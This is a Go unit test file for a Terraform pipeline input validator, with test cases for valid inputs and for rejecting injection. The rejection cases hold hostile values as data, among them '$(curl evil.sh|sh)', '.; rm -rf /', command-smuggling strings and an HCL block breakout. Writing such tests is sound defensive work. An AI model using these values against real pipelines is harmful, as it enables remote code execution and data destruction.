package api

import "testing"

func TestValidatePipelineInputs_Valid(t *testing.T) {
	cases := []struct {
		name             string
		workingDir       string
		repoRef          string
		tfVersion        string
		registryHost     string
		providerVersions map[string]string
		moduleVersions   map[string]string
	}{
		{name: "empty", providerVersions: map[string]string{}, moduleVersions: map[string]string{}},
		{name: "typical", workingDir: "envs/prod", repoRef: "release/1.2", tfVersion: "1.9.5", registryHost: "registry.example.com:8443",
			providerVersions: map[string]string{"aws": ">= 5.40, < 6.0", "azurerm": "~> 3.0"},
			moduleVersions:   map[string]string{"network-core": "2.1.0"}},
		{name: "latest", tfVersion: "latest"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validatePipelineInputs(tc.workingDir, tc.repoRef, tc.tfVersion, tc.registryHost, tc.providerVersions, tc.moduleVersions); err != nil {
				t.Fatalf("expected valid, got error: %v", err)
			}
		})
	}
}

func TestValidatePipelineInputs_RejectsInjection(t *testing.T) {
	cases := []struct {
		name             string
		workingDir       string
		repoRef          string
		tfVersion        string
		registryHost     string
		providerVersions map[string]string
		moduleVersions   map[string]string
	}{
		{name: "working_dir shell", workingDir: "$(curl evil.sh|sh)"},
		{name: "working_dir semicolon", workingDir: ".; rm -rf /"},
		{name: "working_dir backtick", workingDir: "`id`"},
		{name: "repo_ref injection", repoRef: "main\"; touch pwned; #"},
		{name: "tf_version space", tfVersion: "1.9.5 && id"},
		{name: "registry_host path", registryHost: "evil.com/x\"}}}#"},
		{name: "registry_host space", registryHost: "evil.com x"},
		{name: "provider name uppercase/quote", providerVersions: map[string]string{"aws\"": "1.0"}},
		{name: "provider version hcl breakout", providerVersions: map[string]string{"aws": "1.0\" }; provider \"x\" {"}},
		{name: "module name slash", moduleVersions: map[string]string{"net/work": "1.0"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validatePipelineInputs(tc.workingDir, tc.repoRef, tc.tfVersion, tc.registryHost, tc.providerVersions, tc.moduleVersions); err == nil {
				t.Fatalf("expected rejection, got nil error")
			}
		})
	}
}
